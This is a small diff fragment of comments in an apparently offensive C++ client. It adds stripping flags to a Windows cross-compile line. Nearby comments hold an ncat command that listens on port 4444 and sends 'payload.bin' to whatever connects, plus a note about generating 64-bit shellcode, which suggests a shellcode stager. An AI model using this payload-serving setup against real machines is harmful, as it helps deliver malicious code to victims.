@@ -24,6 +24,7 @@
 
 // TODO: -static makes file 2-5x larger
 // x86_64-w64-mingw32-g++ -o client.exe client.cpp -lws2_32 
+// 		-fno-rtti -fno-exceptions -s
 // ncat -lvp 4444 --send-only < payload.bin
 //
 // # Generate 64-bit shellcode
